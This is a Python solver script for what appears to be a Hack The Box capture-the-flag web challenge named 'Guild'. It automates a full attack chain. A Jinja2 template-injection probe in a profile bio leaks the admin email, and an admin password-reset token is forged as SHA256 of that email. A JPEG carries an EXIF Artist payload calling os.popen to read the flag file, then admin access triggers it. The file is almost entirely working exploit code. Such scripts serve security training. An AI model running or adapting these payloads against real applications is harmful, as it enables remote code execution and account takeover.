#!/usr/bin/env python3
"""Guild — bio SSTI leak admin email → SHA256 reset → EXIF Artist SSTI /verify."""
from __future__ import annotations

import argparse
import hashlib
import io
import re
import sys
import time
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from pathlib import Path

from PIL import Image

FLAG_RE = re.compile(r"HTB\{[^}]+\}")
EMAIL_RE = re.compile(r"[A-Za-z0-9]+\@master\.guild")


def opener():
    jar = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def req(op, url, data=None, headers=None, timeout=25):
    h = {"User-Agent": "guild-solver"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=data, headers=h)
    with op.open(r, timeout=timeout) as resp:
        body = resp.read()
        return resp.getcode(), resp.geturl(), body


def form(fields: dict) -> bytes:
    return urllib.parse.urlencode(fields).encode()


def multipart(fields: dict, files: dict) -> tuple[bytes, str]:
    boundary = "----GuildBoundary7MA4YWxkTrZu0gW"
    parts = []
    for k, v in fields.items():
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
        )
    for k, (filename, content, ctype) in files.items():
        parts.append(
            (
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"; "
                f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n"
            ).encode()
            + content
            + b"\r\n"
        )
    parts.append(f"--{boundary}--\r\n".encode())
    return b"".join(parts), f"multipart/form-data; boundary={boundary}"


def jpeg_with_artist(payload: str) -> bytes:
    img = Image.new("RGB", (16, 16), "white")
    exif = img.getexif()
    exif[0x013B] = payload  # Artist
    buf = io.BytesIO()
    img.save(buf, format="JPEG", exif=exif)
    return buf.getvalue()


def save_excerpt(path: Path, text: str, limit: int = 2500) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text[:limit], encoding="utf-8", errors="replace")


def exploit(base: str, evidence: Path | None = None) -> str:
    base = base.rstrip("/")
    ev = evidence
    op = opener()
    uid = str(int(time.time()))[-8:]
    user = f"pwn{uid}"
    email = f"{user}@ex.com"
    password = "Passw0rd!"

    # 1. signup
    req(op, base + "/signup", data=form({
        "email": email, "username": user, "password": password,
    }))
    # 2. login
    code, url, body = req(op, base + "/login", data=form({
        "username": user, "password": password,
    }))
    if ev:
        save_excerpt(ev / "01_login.txt", f"Q: login ok?\ncode={code} url={url}\n{body.decode('utf-8','replace')[:400]}")

    # 3. upload dummy jpg so Verification row exists (also carry EXIF for later)
    artist = "{{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}"
    jpg = jpeg_with_artist(artist)
    data, ctype = multipart({}, {"file": ("badge.jpg", jpg, "image/jpeg")})
    code, url, body = req(
        op, base + "/verification", data=data, headers={"Content-Type": ctype}
    )
    if ev:
        save_excerpt(ev / "02_upload.txt", f"Q: upload verification?\ncode={code} url={url}\n{body.decode('utf-8','replace')[:400]}")

    # 4. bio SSTI probe {{7+7}} then leak admin email
    code, url, body = req(op, base + "/profile", data=form({"bio": "{{7+7}}"}))
    req(op, base + "/getlink")
    code, url, body = req(op, base + "/user/" + user)
    page = body.decode("utf-8", errors="replace")
    if ev:
        save_excerpt(ev / "03_ssti_math.txt", f"Q: bio SSTI {{{{7+7}}}} -> 14?\n{page}")
    if "14" not in page:
        raise SystemExit("SSTI math probe failed")

    req(op, base + "/profile", data=form({"bio": "{{User.query.get(1).email}}"}))
    code, url, body = req(op, base + "/user/" + user)
    page = body.decode("utf-8", errors="replace")
    if ev:
        save_excerpt(ev / "04_ssti_email.txt", f"Q: leak admin email?\n{page}")
    m = EMAIL_RE.search(page)
    if not m:
        raise SystemExit("admin email not leaked")
    admin_email = m.group(0)

    # 5. password reset: token = sha256(email)
    req(op, base + "/forgetpassword", data=form({"email": admin_email}))
    token = hashlib.sha256(admin_email.encode()).hexdigest()
    newpass = "AdminPwn1!"
    code, url, body = req(
        op, base + "/changepasswd/" + token, data=form({"password": newpass})
    )
    if ev:
        save_excerpt(
            ev / "05_reset.txt",
            f"Q: reset admin via sha256(email)?\nemail={admin_email}\ntoken={token}\ncode={code} url={url}\n{body.decode('utf-8','replace')[:400]}",
        )

    # 6. login admin + verify our request (EXIF SSTI, no WAF)
    req(op, base + "/logout")
    code, url, body = req(op, base + "/login", data=form({
        "username": "admin", "password": newpass,
    }))
    if ev:
        save_excerpt(ev / "06_admin_login.txt", f"Q: admin login?\ncode={code} url={url}\n{body.decode('utf-8','replace')[:500]}")

    # verification_id is unknown; scrape /admin table
    code, url, body = req(op, base + "/admin")
    admin_html = body.decode("utf-8", errors="replace")
    if ev:
        save_excerpt(ev / "07_admin_page.txt", f"Q: admin list our verf id?\n{admin_html}")
    # hidden fields
    ids = re.findall(
        r'name="verification_id"\s+value="(\d+)".*?name="user_id"\s+value="(\d+)"'
        r'|name="user_id"\s+value="(\d+)".*?name="verification_id"\s+value="(\d+)"',
        admin_html,
        flags=re.S,
    )
    verf_id = user_id = None
    for a, b, c, d in ids:
        if a and b:
            verf_id, user_id = a, b
        elif c and d:
            user_id, verf_id = c, d
        break
    if not verf_id:
        # fallback: try sequential ids
        for guess in range(1, 30):
            code, url, body = req(
                op,
                base + "/verify",
                data=form({"user_id": "2", "verification_id": str(guess)}),
            )
            text = body.decode("utf-8", errors="replace")
            fm = FLAG_RE.search(text)
            if fm:
                if ev:
                    save_excerpt(ev / "08_verify.txt", f"Q: EXIF SSTI flag?\nverf={guess}\n{text}")
                return fm.group(0)
        raise SystemExit("could not find verification_id")

    code, url, body = req(
        op, base + "/verify", data=form({"user_id": user_id, "verification_id": verf_id})
    )
    text = body.decode("utf-8", errors="replace")
    if ev:
        save_excerpt(ev / "08_verify.txt", f"Q: EXIF SSTI flag?\nverf={verf_id} user={user_id}\n{text}")
    fm = FLAG_RE.search(text)
    if not fm:
        raise SystemExit(f"no flag in /verify: {text[:300]}")
    return fm.group(0)


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://154.57.164.82:31795")
    p.add_argument(
        "--evidence",
        default=str(Path(__file__).resolve().parent / "evidence"),
    )
    args = p.parse_args()
    flag = exploit(args.target, Path(args.evidence))
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
